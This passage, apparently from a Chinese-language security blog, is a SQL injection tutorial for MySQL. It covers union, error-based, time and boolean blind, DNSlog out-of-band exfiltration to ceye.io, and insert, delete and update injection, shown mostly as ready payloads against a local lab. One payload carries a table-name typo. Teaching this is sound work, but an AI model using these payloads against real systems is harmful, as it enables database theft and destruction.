</span></span><span class="line"><span class="cl">7、TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">8、COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">9、CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">10、COLLATIONS表：提供了关于各字符集的对照信息。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">11、COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">12、TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">13、KEY_COLUMN_USAGE表：描述了具有约束的键列。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">14、ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">15、VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">16、TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="注入流程">注入流程</h2>
<p>1.判断是否存在注入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and &#39;1&#39;=&#39;1
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.判断列数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; order by 4--+
</span></span><span class="line"><span class="cl"># 5的时候不显示，4的时候显示正常就是4列
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.数据库名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=0&#39; union select 1,2,3,database()--+
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.根据数据库查数据表名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
</span></span></code></pre></td></tr></table>
</div>
</div><p>5.根据表名查列名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=0&#39; union select 1,2,3,group_concat(column_name) from information_schema.clumns where table_name=&#39;前面查出来的表名&#39; and table_schema=database() --+
</span></span></code></pre></td></tr></table>
</div>
</div><p>6.数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=0&#39; union select 1,2,3,group_concat(password) from users --+
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="联合注入">联合注入</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="s1">&#39; order by 4--+
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=0&#39;</span> union <span class="k">select</span> 1,2,3,database<span class="o">()</span>--+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>0<span class="s1">&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=0&#39;</span> union <span class="k">select</span> 1,2,3,group_concat<span class="o">(</span>column_name<span class="o">)</span> from information_schema.columns where <span class="nv">table_name</span><span class="o">=</span><span class="s2">&#34;users&#34;</span> --+
</span></span><span class="line"><span class="cl"><span class="c1">#group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>0<span class="s1">&#39; union select 1,2,3,group_concat(password) from users --+
</span></span></span><span class="line"><span class="cl"><span class="s1">#group_concat 可替换为 concat_ws(&#39;</span>,<span class="s1">&#39;,id,users,password )
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=0&#39;</span> union <span class="k">select</span> 1,2,3,password from users limit 0,1--+
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="报错注入"><strong>报错注入</strong></h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 1.floor()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and <span class="o">(</span><span class="k">select</span> <span class="m">1</span> from <span class="o">(</span><span class="k">select</span> count<span class="o">(</span>*<span class="o">)</span>,concat<span class="o">(</span>user<span class="o">()</span>,floor<span class="o">(</span>rand<span class="o">(</span>0<span class="o">)</span>*2<span class="o">))</span>x from information_schema.tables group by x<span class="o">)</span>a<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 2.extractvalue()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and <span class="o">(</span>extractvalue<span class="o">(</span>1,concat<span class="o">(</span>0x7e,<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>,0x7e<span class="o">)))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 3.updatexml()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and <span class="o">(</span>updatexml<span class="o">(</span>1,concat<span class="o">(</span>0x7e,<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>,0x7e<span class="o">)</span>,1<span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 4.geometrycollection()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and geometrycollection<span class="o">((</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>a<span class="o">)</span>b<span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 5.multipoint()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and multipoint<span class="o">((</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>a<span class="o">)</span>b<span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 6.polygon()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and polygon<span class="o">((</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>a<span class="o">)</span>b<span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 7.multipolygon()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and multipolygon<span class="o">((</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>a<span class="o">)</span>b<span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 8.linestring()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and linestring<span class="o">((</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>a<span class="o">)</span>b<span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 9.multilinestring()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and multilinestring<span class="o">((</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>a<span class="o">)</span>b<span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 10.exp()</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> where <span class="nv">id</span><span class="o">=</span><span class="m">1</span> and exp<span class="o">(</span>~<span class="o">(</span><span class="k">select</span> * from<span class="o">(</span><span class="k">select</span> user<span class="o">())</span>a<span class="o">))</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>**exp() 报错的原理：**exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</p>
<p>**updatexml() 报错的原理：**由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
<p><strong>floor()报错的原理：</strong><a href="https://www.cnblogs.com/litlife/p/8472323.html"target="_blank" rel="external nofollow noopener noreferrer">Floor报错原理分析 - ka1n4t - 博客园 (cnblogs.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">爆库：
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="s1">&#39; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">爆表：
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span> and updatexml<span class="o">(</span>1,<span class="o">(</span><span class="k">select</span> concat<span class="o">(</span>0x7e,<span class="o">(</span>table_name<span class="o">)</span>,0x7e<span class="o">)</span> from information_schema.tables where <span class="nv">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span> limit 3,1<span class="o">)</span>,1<span class="o">)</span> -- +
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">爆字段：
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="s1">&#39; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">爆数据：
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span> and updatexml<span class="o">(</span>1,<span class="o">(</span><span class="k">select</span> concat<span class="o">(</span>0x7e,password,0x7e<span class="o">)</span> from users limit 1,1<span class="o">)</span>,1<span class="o">)</span> -- +
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">substr<span class="o">(</span>string string,num start,num length<span class="o">)</span><span class="p">;</span> <span class="c1">#string为字符串,start为起始位置,length为长度</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="err">&#39;</span> and updatexml<span class="o">(</span>1,concat<span class="o">(</span>0x7e, substr<span class="o">((</span><span class="k">select</span> password from users limit 1,1<span class="o">)</span>,1,16<span class="o">)</span>,0x7e<span class="o">)</span>,1<span class="o">)</span> -- +
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="盲注"><strong>盲注</strong></h2>
<blockquote>
<p>场景：无回显，并且没有报错和其他显示。且如果能用布尔就不用延迟</p>
</blockquote>
<p><strong>几个相关函数：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">regexp regexp <span class="s1">&#39;^xiaodi[a-z]&#39;</span> 匹配xiaodi及xiaodi...等
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="k">if</span><span class="o">(</span>条件,5,0<span class="o">)</span> 条件成立 返回5 反之 返回0
</span></span><span class="line"><span class="cl">sleep sleep<span class="o">(</span>5<span class="o">)</span> SQL语句延时执行5秒
</span></span><span class="line"><span class="cl">mid mid<span class="o">(</span>a,b,c<span class="o">)</span>从位置 b 开始， 截取 a 字符串的 c 位
</span></span><span class="line"><span class="cl">substr substr<span class="o">(</span>a,b,c<span class="o">)</span>从 b 位置开始， 截取字符串 a 的 c 长度
</span></span><span class="line"><span class="cl">left left<span class="o">(</span>database<span class="o">()</span>,1<span class="o">)</span>，database<span class="o">()</span>显示数据库名称， left<span class="o">(</span>a,b<span class="o">)</span>从左侧截取 a 的前 b 位
</span></span><span class="line"><span class="cl">length length<span class="o">(</span>database<span class="o">())=</span>8，判断数据库database<span class="o">()</span>名的长度
</span></span><span class="line"><span class="cl"><span class="nv">ord</span><span class="o">=</span>ascii ascii<span class="o">(</span>x<span class="o">)=</span>101，判断x的ascii码是否等于101，即email中的字母e
</span></span><span class="line"><span class="cl">IFNULL<span class="o">()</span> 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。
</span></span><span class="line"><span class="cl">CAST<span class="o">()</span>和CONVERT<span class="o">()</span>函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：CAST<span class="o">(</span>value as <span class="nb">type</span><span class="o">)</span><span class="p">;</span> CONVERT<span class="o">(</span>value, <span class="nb">type</span><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="时间注入"><strong>时间注入</strong></h3>
<p>时间盲注也叫延时注入, 一般用到函数 <code>sleep()</code>, <code>BENCHMARK()</code>,还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)</p>
<p>一般时间盲注我们还需结合<strong>条件判断函数</strong>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#if（expre1，result1，result2）</span>
</span></span><span class="line"><span class="cl">当 expre1 为 <span class="nb">true</span> 时，返回 result1，false 时，返回 result2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#盲注的同时也配合着 mysql 提供的分割函数：substr、substring、left</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有： <code>ascii()</code>,<code> hex()</code> 等等</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=1&#39; and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1)--+
</span></span></code></pre></td></tr></table>
</div>
</div><p>步骤跟正常注入一样，只不过是逐位判断ascii码，如果为某个值，就sleep延时几秒的方式。</p>
<h3 id="布尔盲注"><strong>布尔盲注</strong></h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="s1">&#39; and substr((select user()),1,1)=&#39;</span>r<span class="s1">&#39; -- +
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span> and IFNULL<span class="o">((</span>substr<span class="o">((</span><span class="k">select</span> user<span class="o">())</span>,1,1<span class="o">)=</span><span class="s1">&#39;r&#39;</span><span class="o">)</span>,0<span class="o">)</span> -- +
</span></span><span class="line"><span class="cl"><span class="c1">#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="s1">&#39; and strcmp((substr((select user()),1,1)=&#39;</span>r<span class="err">&#39;</span><span class="o">)</span>,1<span class="o">)</span> -- +
</span></span><span class="line"><span class="cl"><span class="c1">#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 </span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dnslog注入">DNSlog注入</h3>
<blockquote>
<p>解决了盲注不能回显数据，效率低的问题</p>
</blockquote>
<p><strong>前提：</strong>
需要高权限
需要是Windows系统</p>
<p><strong>工具：</strong></p>
<p><a href="http://ceye.io/"target="_blank" rel="external nofollow noopener noreferrer">http://ceye.io/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>
或者其他DNSlog平台
工具，如：https://github.com/ADOOO/DnslogSqlinj</p>
<p>使用语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:8080/sqlilabs/less-2/?id<span class="o">=</span>-1 and <span class="k">if</span><span class="o">((</span><span class="k">select</span> load_file<span class="o">(</span>concat<span class="o">(</span><span class="s1">&#39;\\\\&#39;</span>,<span class="o">(</span><span class="k">select</span> version<span class="o">())</span>,<span class="s1">&#39;.1t7i2f.ceye.io\\abc&#39;</span><span class="o">)))</span>,1,0<span class="o">)</span>--+
</span></span><span class="line"><span class="cl"><span class="c1"># 使用load_file函数，里面带上我们dns log平台的域名， 然后在平台的DNSQuery里面看到结果</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="http://image.xpshuai.cn/img/image-20220119192501632.png"
    data-srcset="http://image.xpshuai.cn/img/image-20220119192501632.png, http://image.xpshuai.cn/img/image-20220119192501632.png 1.5x, http://image.xpshuai.cn/img/image-20220119192501632.png 2x"
    data-sizes="auto"
    alt="http://image.xpshuai.cn/img/image-20220119192501632.png"
    title="http://image.xpshuai.cn/img/image-20220119192501632.png"/></p>
<h2 id="insertdeleteupdate">insert,delete,update</h2>
<p>insert,delete,update 主要是用到盲注和报错注入，此类注入点<strong>不建议使用 sqlmap 等工具</strong>，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般<strong>较难发现</strong>，我们可以<strong>尝试性插入</strong> 引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p>
<h3 id="报错">报错</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; insert into admin (id,username,password) values (2,&#34;or updatexml(1,concat(0x7e,(version())),0) or&#34;,&#34;admin&#34;);
</span></span><span class="line"><span class="cl">Query OK, 1 row affected (0.00 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; select * from admin;
</span></span><span class="line"><span class="cl">+------+-----------------------------------------------+----------+
</span></span><span class="line"><span class="cl">| id   | username                                      | password |
</span></span><span class="line"><span class="cl">+------+-----------------------------------------------+----------+
</span></span><span class="line"><span class="cl">|    1 | admin                                         | admin    |
</span></span><span class="line"><span class="cl">|    1 | and 1=1                                       | admin    |
</span></span><span class="line"><span class="cl">|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
</span></span><span class="line"><span class="cl">+------+-----------------------------------------------+----------+
</span></span><span class="line"><span class="cl">3 rows in set (0.00 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; insert into admin (id,username,password) values (2,&#34;&#34;or updatexml(1,concat(0x7e,(version())),0) or&#34;&#34;,&#34;admin&#34;);
</span></span><span class="line"><span class="cl">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#delete 注入很危险，很危险，很危险，切记不能使用 or 1=1 ，or 右边一定要为false
</span></span><span class="line"><span class="cl">mysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
</span></span><span class="line"><span class="cl">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="盲注-1">盲注</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等
</span></span><span class="line"><span class="cl">mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1),&#39;1&#39;,&#34;admin&#34;);
</span></span><span class="line"><span class="cl">Query OK, 1 row affected (5.00 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#39;p&#39;),sleep(5),1),&#39;1&#39;,&#34;admin&#34;);
</span></span><span class="line"><span class="cl">Query OK, 1 row affected (0.00 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#字符型注意闭合不能使用and
</span></span><span class="line"><span class="cl">mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)=&#39;p&#39;),sleep(5),1)+&#39;&#39;,&#34;admin&#34;);
</span></span><span class="line"><span class="cl">Query OK, 1 row affected (0.00 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1)+&#39;&#39;,&#34;admin&#34;);
</span></span><span class="line"><span class="cl">Query OK, 1 row affected (5.01 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># delete 函数 or 右边一定要为 false
</span></span><span class="line"><span class="cl">mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r4&#39;),sleep(5),0);
</span></span><span class="line"><span class="cl">Query OK, 0 rows affected (0.00 sec)
</span></span><span class="line"><span class="cl">
